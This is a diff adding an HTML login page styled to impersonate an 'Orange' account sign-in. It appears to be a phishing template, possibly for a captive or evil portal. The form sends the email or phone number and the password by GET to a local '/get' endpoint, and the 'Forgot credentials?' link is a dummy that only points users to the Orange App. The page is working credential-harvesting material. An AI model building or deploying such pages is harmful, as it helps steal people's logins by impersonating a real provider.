@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        @media (min-width: 600px) {
+            .container {
+                max-width: 500px;
+            }
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background-color: #ff7f00;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 20px;
+            position: relative;
+            padding-bottom: 5px; 
+			padding-left: 15px
+			padding-right: 15px
+            box-sizing: border-box;
+        }
+
+        .form-container {
+            background: #ffffff;
+            border: 1px solid #ff7f00;
+            border-radius: 4px;
+            padding: 20px;
+            box-shadow: 0px 0px 10px 0px rgba(255, 127, 0, 0.2);
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 500;
+            color: #ff7f00;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ff7f00;
+            border-radius: 4px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            background: #ff7f00;
+            border: none;
+            color: #ffffff;
+            padding: 12px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .submit-btn:hover {
+            background: #e66f00;
+        }
+		
+		.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: red;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="logo-container">
+            <div class="logo">orange</div>
+        </div>
+
+        <div class="form-container">
+
+            <center>
+                <h1>Sign in</h1>
+                <h2>Use your Orange Account</h2>
+            </center>
+
+            <form action="/get" id="login-form">
+
+                <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+
+                <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+				<a href="javascript:void(0);" class="forgot-password">Forgot credentials?</a>
+
+                <button class="submit-btn" type="submit">Continue</button>
+				<div class="error-message"></div>
+
+
+            </form>
+
+        </div>
+
+    </div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "Please refer to your Orange App if you forgot your credentials";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</body>
+
+</html>
